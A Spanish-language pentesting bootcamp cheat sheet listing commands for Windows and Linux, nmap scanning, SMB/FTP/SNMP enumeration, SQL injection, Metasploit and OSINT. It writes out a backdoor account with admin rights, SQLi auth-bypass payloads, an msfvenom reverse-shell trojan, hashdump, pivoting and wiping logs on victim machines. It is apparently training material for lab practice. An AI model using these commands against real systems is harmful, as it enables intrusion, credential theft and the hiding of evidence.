# 💀 GUÍA DE CAMPO: ARSENAL TÉCNICO AVANZADO (BOOTCAMP #2)

Esta guía consolida las tácticas, técnicas y procedimientos (TTPs) para el control de sistemas Windows/Linux, virtualización ofensiva, reconocimiento profundo y explotación web/infraestructura.

---

## 📂 CARPETA: WINDOWS COMMAND & CONTROL (CMD / POWERSHELL)

Dominar la CLI de Windows es obligatorio para la post-explotación y movimiento lateral.

### 1. Gestión de Ficheros y Navegación
* **Listar:** `dir` (CMD) / `Get-ChildItem` o `ls` (PS). Parámetros: `/a` (ocultos).
* **Moverse:** `cd [ruta]`.
* **Crear:** `mkdir [nombre]` o `md [nombre]`.
* **Borrar:** `del [archivo]` / `rmdir [carpeta]`.
* **Copiar/Mover:** `copy`, `xcopy` (recursivo), `move`.
* **Leer:** `type [archivo]`.
* **Atributos:** `attrib +h +s [archivo]` (Ocultar como archivo de sistema - persistencia básica).

### 2. Gestión de Usuarios y Grupos (Persistencia)
* **Crear Usuario (Backdoor):**
    ```cmd
    net user [usuario] [password] /add
    ```
    *En PowerShell:* `New-LocalUser -Name "0xRed" -NoPassword`
* **Escalar a Admin:**
    ```cmd
    net localgroup Administradores [usuario] /add
    ```
* **Borrar Huellas:** `net user [usuario] /delete`.

### 3. Redes y Reconocimiento Interno
* **Configuración IP:** `ipconfig /all`.
* **Tabla ARP:** `arp -a` (Ver vecinos en la red).
* **DNS:** `ipconfig /flushdns`, `nslookup [dominio]`.
* **Conexiones Activas (Vital para Blue/Red Team):**
    ```cmd
    netstat -ano
    ```
    *(Muestra puertos abiertos, conexiones establecidas y PIDs asociados).*
* **Ruteo:** `route print`, `tracert`.

### 4. Procesos y Servicios
* **Listar:** `tasklist`.
* **Matar:** `taskkill /PID [pid] /F` (Forzado).
* **PowerShell:** `Get-Process`, `Stop-Process`, `Start-Process`.

---

## 📂 CARPETA: LINUX WARFARE (BASH)

La base del sistema operativo ofensivo (Kali/Parrot).

### 1. Manipulación del Sistema
* **Permisos (chmod):**
    * `chmod +x script.sh` (Hacer ejecutable).
    * `chmod 777` (Permisos totales - rwx para todos).
    * `chmod 400` (Solo lectura para el dueño - claves SSH).
* **Propietarios (chown):** `chown usuario:grupo archivo`.
* **Búsqueda (find):**
    * Buscar binarios SUID (Escalada de privilegios): `find / -perm -4000 2>/dev/null`.
* **Filtrado (grep):** `cat archivo | grep "password"`.

### 2. Redirecciones y Tuberías
* `>`: Sobrescribir salida a fichero.
* `>>`: Añadir salida a fichero.
* `|` (Pipe): Usar la salida de un comando como entrada de otro.
* `2>/dev/null`: Enviar errores al agujero negro (limpieza de output).

### 3. Gestión de Paquetes
* `apt update && apt upgrade`: Actualizar arsenal.
* `dpkg -i [paquete.deb]`: Instalar paquetes locales.

---

## 📂 CARPETA: VIRTUALIZACIÓN & CONTENEDORES (LABORATORY)

### 1. VirtualBox (Hipervisor Tipo 2)
* **Snapshots:** Crear puntos de restauración antes de ejecutar malware o exploits inestables.
* **Redes:**
    * *NAT:* Salida a internet, IP aislada.
    * *Bridge (Adaptador Puente):* La VM es un dispositivo más en tu red física (puedes atacarla desde otro PC).
    * *Red Interna:* Aislamiento total, solo se ven entre VMs.

### 2. Docker (Despliegue Rápido de Objetivos)
Ideal para levantar entornos vulnerables (DVWA, Metasploitable) rápidamente.

* **Correr contenedor:** `docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa`
    * `-d`: Detached (segundo plano).
    * `-p`: Mapeo de puertos (Host:Contenedor).
* **Listar:** `docker ps` (activos), `docker ps -a` (todos).
* **Ejecutar comandos dentro:** `docker exec -it [id_contenedor] /bin/bash` (Shell interactiva).
* **Docker Compose:** Orquestación de múltiples contenedores mediante archivos YAML.

---

## 📂 CARPETA: RECONOCIMIENTO ACTIVO (NMAP)

El estándar para mapear redes.

### 1. Descubrimiento de Host (Host Discovery)
* `-sn`: Ping Scan (sin escaneo de puertos).
* `-Pn`: Tratar todos los hosts como online (Bypass bloqueo de ICMP/Ping).

### 2. Técnicas de Escaneo de Puertos
* `-sS` (SYN Scan): Sigiloso, no completa el handshake TCP. (Requiere root).
* `-sT` (Connect Scan): Completa la conexión (más ruidoso).
* `-sU`: Escaneo de puertos UDP (Lento).
* `-p-`: Escanear los 65535 puertos.

### 3. Enumeración de Servicios y Versiones
* `-sV`: Detectar versiones de servicios.
* `-O`: Detectar Sistema Operativo (OS Fingerprinting).

### 4. Nmap Scripting Engine (NSE)
* `-sC`: Scripts por defecto.
* `--script vuln`: Buscar vulnerabilidades conocidas.
* `--script smb-vuln*`: Scripts específicos para SMB.

### 5. Evasión y Rendimiento
* `-T[0-5]`: Velocidad (T4 es agresivo/rápido).
* `--min-rate 5000`: Forzar envío de paquetes.

---

## 📂 CARPETA: EXPOSICIÓN DE SERVICIOS (ENUMERATION)

### 1. SMB (Server Message Block - Puertos 139/445)
Vector crítico en redes Windows.
* **Herramientas:**
    * `smbclient -L //IP -N`: Listar recursos compartidos (Null Session).
    * `enum4linux -a [IP]`: Enumeración exhaustiva.
    * `crackmapexec smb [IP] -u 'user' -p 'pass' --shares`: Enumeración moderna.
* **Ataque:** EternalBlue (MS17-010) para RCE.

### 2. FTP (File Transfer Protocol - Puerto 21)
* **Vector:** Login Anónimo (`Anonymous` / sin password).
* **Comandos:** `get` (descargar), `put` (subir webshells).

### 3. SNMP (Simple Network Management Protocol - Puerto 161 UDP)
* **Vector:** Community Strings por defecto (`public`, `private`).
* **Herramienta:** `snmpwalk -c public -v1 [IP]`. (Extrae usuarios, procesos, software).

### 4. RDP (Remote Desktop - Puerto 3389)
* **Vector:** Fuerza bruta o vulnerabilidades como BlueKeep.

---

## 📂 CARPETA: WEB HACKING (OWASP & TOOLS)

### 1. Burp Suite (El Proxy)
* **Interceptor:** Capturar y modificar peticiones al vuelo.
* **Repeater:** Reenviar peticiones modificadas manualmente.
* **Intruder:** Fuzzing y fuerza bruta (Snipers, Cluster Bomb).

### 2. SQL Injection (SQLi)
Romper la consulta a la base de datos.
* **Error Based:** `'` (Comilla simple para romper sintaxis).
* **Auth Bypass:** `' OR 1=1 -- -` (Login sin contraseña).
* **Union Based:** `UNION SELECT null, database(), user() --` (Extraer datos).
* **Blind SQLi:** Inferencia por tiempos (`SLEEP(10)`) o respuestas booleanas.

### 3. Fuzzing de Directorios
Encontrar paneles de admin o archivos ocultos.
* **Herramientas:** `gobuster`, `dirbuster`, `dirb`.
* **Comando:** `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`.

---

## 📂 CARPETA: EXPLOTACIÓN (METASPLOIT FRAMEWORK)

La navaja suiza de la explotación.

### 1. Estructura y Comandos Básicos
* `msfconsole`: Iniciar.
* `search [término]`: Buscar exploits (ej: `search eternalblue`).
* `use [id/ruta]`: Seleccionar exploit.
* `show options`: Ver parámetros requeridos.
* `set RHOSTS [IP]`: Configurar objetivo.
* `set LHOST [Tu_IP]`: Configurar tu IP (para la reverse shell).
* `exploit` o `run`: Ejecutar.

### 2. Payloads (Meterpreter)
* **Reverse Shell:** La víctima se conecta a ti (Bypass Firewall saliente).
* **Comandos Meterpreter:**
    * `sysinfo`: Información del sistema.
    * `getuid`: Quién eres.
    * `upload / download`: Mover archivos.
    * `shell`: Bajar a una shell del sistema nativo.
    * `hashdump`: Volcar hashes de contraseñas.

### 3. Pivoting
Usar una máquina comprometida para atacar otra red interna inaccesible.
* **Autoroute:** `run autoroute -s [red_interna]`.
* **Port Forwarding:** `portfwd add -l [puerto_local] -p [puerto_remoto] -r [ip_objetivo]`.

### 4. MSFVenom
Creación de payloads manuales (Troyanos).
* **Windows:** `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o shell.exe`

---

## 📂 CARPETA: OSINT (INTELIGENCIA DE FUENTES ABIERTAS)

### 1. Google Dorks
Uso de operadores avanzados para encontrar información sensible.
* `site:target.com`: Limitar al dominio.
* `filetype:pdf`: Buscar archivos específicos.
* `intitle:"index of"`: Directorios expuestos.
* `intext:"password"`: Buscar credenciales en texto plano.

### 2. Herramientas
* **TheHarvester:** Recolector de emails y subdominios.
* **OSINT Framework:** Colección de recursos.
* **Shodan:** Buscador de dispositivos conectados a internet (IoT, Servers, Cámaras).

---

## ⚠️ NOTA DE SEGURIDAD OPERACIONAL (OPSEC)
* **Tratamiento de TTY:** Al obtener una reverse shell en Linux, estabilízala:
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    Luego `CTRL+Z`, `stty raw -echo; fg`, `reset`.
* **Limpieza:** Borra logs y herramientas subidas a la máquina víctima (`rm`, `wevtutil cl`).